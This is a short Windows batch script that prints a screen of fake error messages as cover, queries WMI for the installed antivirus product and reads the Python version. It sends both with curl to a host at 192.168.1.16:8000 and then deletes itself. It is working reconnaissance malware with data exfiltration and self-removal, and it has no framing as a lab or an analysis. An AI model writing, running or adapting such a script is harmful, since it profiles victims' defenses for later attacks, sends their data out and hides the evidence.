@echo off
for /l %%i in (1, 1, 20) do (
    echo Error: Something went wrong.
)
for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
echo Antivirus Information: %antivirus%
for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
echo Python Version: %python_version%
curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" http://192.168.1.16:8000
del "%~f0"
